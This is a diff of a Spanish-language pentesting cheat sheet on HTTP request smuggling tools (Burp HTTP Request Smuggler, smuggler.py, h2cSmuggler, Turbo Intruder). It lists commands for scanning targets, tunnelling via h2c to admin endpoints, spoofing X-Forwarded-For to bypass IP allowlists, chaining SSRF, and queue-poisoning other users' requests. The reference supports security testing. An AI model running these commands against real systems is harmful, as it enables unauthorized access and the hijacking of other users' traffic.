@@ -26,16 +26,14 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Instalar | Burp → Extensions → BApp Store → "HTTP Request Smuggler" | Hecha por James Kettle (PortSwigger). |
-| Smuggle Probe | Right-click request → "Smuggle Probe" | Auto-detecta CL.TE, TE.CL, TE.TE, CL.CL, H2.* |
-| Smuggle Attack | Right-click → "Smuggle Attack" | Crafting manual con templates. |
-| HTTP/2 Probe | Sub-opción para forzar H2 | Detecta H2.CL / H2.TE / pseudo-header injection. |
-| Auto-calc Content-Length | UI muestra CL correcto al editar | Evita bugs manuales. |
-| Confirm vuln | Después de probe, click "Validate" → tool envía request real y mide diff | Doble check antes de exploit. |
-| Tunnel feature | "Smuggle to fail open" — abre conn TCP smuggleada para múltiples requests | Sesión persistente. |
-| Pipeline mode | "Send group → in single connection" del Repeater | Necesario para reproducir HRS. |
-| Save findings | Tool exporta payloads en formato curl/raw | Para reportes. |
-| Combinar con Turbo Intruder | Click "Send to Turbo Intruder" | Para race / volume tests. |
+| Burp → Extensions → BApp Store → "HTTP Request Smuggler" → Install | Setup extension (James Kettle / PortSwigger) | Primera vez. |
+| Right-click request → "HTTP Request Smuggler" → "Smuggle probe" | Auto-detect CL.TE/TE.CL/TE.TE/CL.CL/H2.* | Initial detection. |
+| Right-click → "HTTP Request Smuggler" → "Smuggle attack" → seleccionar tipo | Crafting interactivo con templates | Post-detection exploit. |
+| Burp Repeater → toggle HTTP/2 → "Inspector" → "Request smuggling" mode | H2.CL / H2.TE / pseudo-header injection | H2 endpoints. |
+| Burp Repeater → "Send group → in single connection" | Reproducir HRS multi-request | Validation. |
+| Right-click smuggle attack → "Send to Turbo Intruder" | Race + smuggle combo | Volume testing. |
+| Smuggle attack → "Validate" button | Double-check vector antes de exploit | Pre-exploit confirmation. |
+| Burp Smuggler → "Cache poisoning via smuggling" mode | Auto-setup cache poison combo | Specific chain. |
 ^hrs-tool-burp
 
 ___
@@ -44,18 +42,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Repo | `git clone https://github.com/defparam/smuggler && cd smuggler` | CLI standalone. |
-| Probe rápido | `python3 smuggler.py -u https://target/` | Test all techniques contra single URL. |
-| Modo verbose | `python3 smuggler.py -u https://target/ -v v` | Logs detallados de timing. |
-| Test specific technique | `python3 smuggler.py -u https://target/ -m exploit_clte` | Solo CL.TE. |
-| Lista de URLs | `python3 smuggler.py -l urls.txt` | Bulk test. |
-| Output payload | Genera HTTP raw que se puede mandar manual | Buena para custom exploit. |
-| Modo "exploit" | `--exploit-mode` después de detection | Auto-genera prueba de concept. |
-| Custom config file | `python3 smuggler.py -u url -c config.py` | Override timing/timeouts. |
-| Output a archivo | `python3 smuggler.py -u url > findings.log` | Captura para reporte. |
-| Threads | `-t 5` | Default 5, no exagerar (puede romper servers). |
-| Timeout per probe | `--timeout 5` | Ajustar a target slow/fast. |
-| Skip TLS verify | `--no-verify` | Para testing/labs. |
+| `git clone https://github.com/defparam/smuggler && cd smuggler` | Install CLI standalone | Primera vez. |
+| `python3 smuggler.py -u https://target/` | Test all techniques contra URL | Quick scan. |
+| `python3 smuggler.py -u https://target/ -v v` | Verbose timing logs | Debug. |
+| `python3 smuggler.py -u https://target/ -m exploit_clte` | Solo CL.TE technique | Targeted test. |
+| `python3 smuggler.py -l urls.txt -t 5` | Bulk multiple URLs | Volume scan. |
+| `python3 smuggler.py -u https://target/ --no-verify` | Skip TLS validation | Labs / self-signed. |
+| `python3 smuggler.py -u https://target/ > findings.log` | Output a archivo reportable | Post-scan capture. |
+| `python3 smuggler.py -u https://target/ --timeout 10` | Aumentar timeout | Slow targets. |
 ^hrs-tool-smuggler-py
 
 ___
@@ -64,15 +58,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Repo | `git clone https://github.com/BishopFox/h2csmuggler && cd h2csmuggler` | Python H2 client low-level. |
-| Probe support | `python3 h2csmuggler.py -x https://target/` | Detecta si frontend acepta upgrade h2c. |
-| Smuggle GET | `python3 h2csmuggler.py -x https://target/ -X GET /admin` | Acceder endpoint vía túnel h2c. |
-| Smuggle POST | `python3 h2csmuggler.py -x https://target/ -X "POST /api" --post-data 'x=1'` | POST con body. |
-| Custom headers | `python3 h2csmuggler.py -x https://target/ -X /admin -H "X-Forwarded-For: 127.0.0.1"` | Headers extras. |
-| Bypass IP filter | Smuggle con `Host: localhost` o `X-Forwarded-For: 127.0.0.1` | Para alcanzar internal. |
-| Test multi paths | Loop sobre lista de paths | Bash + script para enumeration. |
-| Connection reuse | Tool mantiene conn abierta — múltiples queries por sesión | Eficiente. |
-| Verbose | `-v` | Frame-level debug. |
+| `git clone https://github.com/BishopFox/h2csmuggler && cd h2csmuggler` | Install h2cSmuggler | Primera vez. |
+| `python3 h2csmuggler.py -x https://target/` | Detecta si frontend acepta h2c upgrade | Initial probe. |
+| `python3 h2csmuggler.py -x https://target/ -X /admin` | Acceder endpoint vía h2c túnel | Bypass front controls. |
+| `python3 h2csmuggler.py -x https://target/ -X "POST /api" --post-data 'x=1'` | POST con body via h2c | Modify operations. |
+| `python3 h2csmuggler.py -x https://target/ -X /admin -H "X-Forwarded-For: 127.0.0.1"` | h2c + IP spoof bypass combo | Internal IP allowlist. |
+| `for p in /admin /api/internal /actuator /debug /health; do python3 h2csmuggler.py -x https://target/ -X "GET $p"; done` | Bulk path enumeration via h2c | Discovery. |
+| `python3 h2csmuggler.py -x https://target/ -X "GET /api/proxy?url=http://127.0.0.1:8080/admin"` | h2c + SSRF chain | Compound. |
+| `python3 h2csmuggler.py -x https://target/ -v` | Frame-level debug | Troubleshoot. |
 ^hrs-tool-h2csmuggler
 
 ### Workflow h2cSmuggler
@@ -99,15 +92,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Instalar | Burp → Extensions → "Turbo Intruder" (BApp Store) | Necesario para race conditions y HRS heavy. |
-| Single connection mode | `engine=Engine.BURP, pipeline=False` en script | Required para HRS (todos los requests en misma TCP conn). |
-| Race + smuggle combo | Loop con delay corto + payloads smuggle | Para vectors timing-sensitive. |
-| Script template smuggle | Usar templates de PortSwigger labs | https://github.com/PortSwigger/turbo-intruder/tree/master/resources/examples |
-| Custom CL calc | Script Python calcula CL automáticamente | Variable `body` y bytes count. |
-| Ataques de queue poisoning | Mandar smuggle + N requests legit + medir cuál respuesta llega a quién | Volumen necesario. |
-| Output a file | `engine.queue(req)` + capture responses | Para análisis post. |
-| Concurrencia | `engine=Engine.BURP, concurrentConnections=1` | Single-conn vs multi-conn según test. |
-| Script ejemplo CL.TE | Disponible en repo PortSwigger | Punto de partida estable. |
+| Burp → Extensions → BApp Store → "Turbo Intruder" → Install | Setup extension | Primera vez. |
+| Right-click request → "Send to Turbo Intruder" → script con `engine=Engine.BURP, concurrentConnections=1, pipeline=False` | Single-conn HRS race setup | HRS race timing. |
+| Script con `engine.queue(smuggle_req); for i in range(10): engine.queue(legit_req)` | Queue poisoning bulk | Multi-victim race. |
+| Browser → https://github.com/PortSwigger/turbo-intruder/tree/master/resources/examples → ver scripts ejemplo | Templates HRS oficiales | Foundation. |
+| `python3 -c "body = '...smuggled...'; print(len(body))"` | Calc CL bytes en script | Manual byte count. |
+| Turbo Intruder script con `requestsPerConnection=100` | Volume race en single conn | Stress test. |
+^hrs-tool-turbo
 ^hrs-tool-turbo
 
 ### Script Turbo Intruder ejemplo (CL.TE smuggle queue)
